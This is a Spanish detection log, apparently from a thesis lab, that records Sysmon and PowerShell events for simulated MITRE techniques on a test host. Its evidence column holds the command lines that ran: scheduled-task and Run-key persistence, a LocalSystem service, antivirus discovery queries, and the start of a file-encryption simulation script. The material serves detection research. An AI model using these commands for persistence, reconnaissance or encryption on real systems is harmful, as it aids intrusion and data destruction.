Alertas / detecciones VR normalizadas														
Filas CLIENT_EVENT reales dentro de ventana canonica. JSONL/Discord no equivalen a deteccion.														
														
timestamp	profile	TEC	MITRE	IOA_DetectionName	Artifact	host	source	raw_evidence	campana	tipo_campana	validacion	EventID	SignalType	source_file
2026-06-24T12:50:22.576Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.589Z	P3	TEC-005	T1569.002	TEC-005 Windows service creation	TEC005_Service_System7045	LT29.ait.us.es	System	{ "ServiceName": "TFM TEC005 Test Service", "ImagePath": "C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt", "ServiceType": "servicio de modo usuario", "StartType": "inicio por solicitud", "AccountName": "LocalSystem" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	7045	System 7045	05_LOGS\Validas\Prueba_24_06_2026\TEC005_Service_System7045-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.900Z	P3	TEC-006	T1518.001	TEC-006 Security Software Discovery	TEC006_SecuritySoftwareDiscovery_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:16.265Z	P3	TEC-006	T1518.001	TEC-006 Security Software Discovery	TEC006_SecuritySoftwareDiscovery_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:53.103Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	param( [string]$TargetPath = "", [string]$OutputDir = "" ) Set-StrictMode -Version Latest $ErrorActionPreference = "Stop" $BasePath = $env:TFM_BASEPATH if ([string]::IsNullOrWhiteSpace($BasePath)) { $BasePath = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas" } $env:TFM_BASEPATH = $BasePath if ([string]::IsNullOrWhiteSpace($TargetPath)) { $TargetPath = Join-Path $BasePath "DUMB_LAB" } if ([string]::IsNullOrWhiteSpace($OutputDir)) { $OutputDir = $PSScriptRoot } if (-not (Test-Path -LiteralPath $TargetPath)) { throw "TargetPath does not exist: $TargetPath" } New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null $TxtFile = Join-Path $OutputDir "lista_archivos.txt" $CsvFile = Join-Path $OutputDir "lista_archivos.csv" $files = @( Get-ChildItem -LiteralPath $TargetPath -Recurse -File -ErrorAction Stop | Where-Object { $_.Extension -ne ".aes" } | Sort-Object FullName ) $files ...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:53.660Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	{ $_.Extension -ne ".aes" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
